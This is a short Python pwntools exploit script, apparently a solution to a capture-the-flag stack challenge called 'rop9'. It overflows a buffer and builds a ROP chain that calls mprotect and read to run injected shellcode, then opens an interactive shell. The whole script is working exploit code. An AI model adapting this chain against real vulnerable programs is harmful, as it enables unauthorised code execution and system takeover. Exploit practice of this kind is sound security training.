from pwn import *

r=process('./pwn/stack/rop-9/rop9')

context.arch="i386"
# context.log_level='debug'
context.terminal=["tmux","splitw","-h"]

mprotect = 0x0806EC80
buf = 0x80ea000
pop_3_ret = 0x0804f460
read_addr = 0x0806E140

payload = b'a'*56
payload += p32(mprotect)
payload += p32(pop_3_ret)
payload += p32(buf)
payload += p32(0x1000)
payload += p32(0x7)
payload += p32(read_addr)
payload += p32(buf)
payload += p32(0)
payload += p32(buf)
payload += p32(0x100)
r.sendline(payload)


shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
r.sendline(shellcode)

r.interactive()